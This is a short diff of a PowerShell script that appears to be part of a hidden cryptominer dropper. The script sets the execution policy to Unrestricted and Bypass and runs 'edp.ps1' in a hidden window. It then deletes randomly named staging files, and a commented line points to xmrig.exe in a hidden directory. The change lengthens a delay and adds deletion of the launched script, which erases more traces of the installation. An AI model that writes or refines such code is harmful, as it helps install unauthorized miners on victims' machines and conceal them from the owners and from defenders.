@@ -263,7 +263,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 Start-Process -Set-ExecutionPolicy Bypass -FilePath "$path\edp.ps1" -windowstyle hidden
 
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 360
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
@@ -271,4 +271,5 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$path\w.bat"
+Remove-Item -Path "$path\edp.ps1"
 # Remove-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe"
